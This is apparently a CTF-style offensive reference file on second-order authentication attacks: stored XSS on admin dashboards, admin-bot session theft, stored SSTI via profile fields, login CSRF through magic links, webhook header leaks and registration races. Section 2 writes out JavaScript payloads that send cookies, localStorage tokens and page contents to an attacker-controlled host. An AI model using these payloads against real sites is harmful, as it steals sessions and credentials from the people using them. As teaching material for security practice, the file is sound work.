# Second-order auth — the delayed/deferred exploit

The bug you can't trigger from the request that creates it: a stored
payload, an async job, a bot that logs in later, a webhook that fires on
the next request. The auth surface is the same — the *timing* changes.

---

## 1. Stored-role injection

`POST /register {"role":"admin"}` is rejected, but `POST /profile
{"bio":"<script>..."}` — the *role* is sanitized on write but the
*bio* is rendered unescaped on an admin's dashboard. XSS + session theft
as the chain.

Auth-flavored variant: `POST /profile {"theme":"admin"}` — a `theme`
that later gets `eval`'d or template-rendered server-side on the admin
view.

## 2. The bot-login primitive

CTF bots (`/report`, `/visit`, `/share`) log in *as admin* then visit
your URL. The flow:

```
you submit URL → bot logs in as admin → bot visits your URL →
  your page reads document.cookie / localStorage
```

The bot's session is the flag-adjacent asset. Get it via:

- `new Image().src='//you/?c='+document.cookie` — if `HttpOnly` missing
- `fetch('/api/me').then(r=>r.text()).then(t=>fetch('//you/?d='+btoa(t)))`
- `new Image().src='//you/?t='+localStorage.token`
- `new Image().src='//you/?f='+document.getElementById('flag').innerText`

See `skills/web-xss/` for the full steal corpus — this file covers when
the auth surface *is* the target.

## 3. Deferred-session attacks

- A "magic link" that logs you in is a bearer credential — if the
  `verify` endpoint does `GET /magic?token=T` → `Set-Cookie: admin=...`
  then the link clicked by a victim logs *their browser* in as *you*
  (login CSRF), or if you're on the same link, gives you their session.
- A session id minted for a *scheduled* action (`/task` runs at :00)
  may be predictable — the token is `sha256(taskname)`.
- A "remember this device" cookie set on a *pre-MFA* screen — the
  cookie survives the MFA step it's supposed to skip.

## 4. Async job leaks

- A job that runs "as admin" reads `user.input` for a template
  `{% if user.role == 'admin' %}` — you don't have admin but the JOB
  does → SSTI through a stored field (`skills/web-ssti/`).
- An email-renderer (`/admin/mail/send`) interpolates `{{user.bio}}`
  with *your* bio → SSTI into the admin's rendered mail.
- A report-generator (`/admin/report`) reads `user.theme` as a Jinja/
  EJS context → stored SSTI.

## 5. Webhook / callback confusions

- `POST /webhook` from the app to your server — the callback may carry
  the server's own session/authorization header if it's a redirect chain
  (`webhook` → 302 → your server sees the `Authorization` forwarded).
- A `callback_uri`/`redirect_uri` that's stored for later (OAuth) —
  swap it *after* registration.

## 6. The registration-race

`htb-ssos` shape: register two accounts with the same canonical email in
parallel; the uniqueness check passes for both before either inserts →
two accounts, one email — the second can "verify" the first's session
or claim.

```bash
python3 tools/web/race_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/register" --body '{"email":"v@t.tld","password":"x","username":"a"}' \
  --write-ack
```

## 7. Token-in-URL deferred leak

`GET /confirm?token=T` page loads a captcha/analytics/tracker — the
`Referer` to the tracker carries `token=T` even though the page itself
is same-origin.

- `rel="noreferrer"` on the resource → safe.
- `Referrer-Policy: no-referrer` on the page → safe.
- Neither → the token is in someone else's log.

## 8. Second-order session stores

- The session *content* is built from `user.profile_json` which you
  wrote earlier — the session is serialized *from* a field you control.
  For deserialization stores (pickle/Marshal/Java) that's RCE-adjacent;
  for JSON stores it's claim pollution.
- A "session export" feature (`GET /session/download`) dumps the
  server-side session — including fields you can't see via `/api/me`.

## 9. Falsifiers

- The bot visits without any auth (check the report endpoint docs or
  look for `bot.js` in the handout).
- The "stored" field is sanitized on *read* too — no second-order.
- The async job runs as a *service* account with no user context.
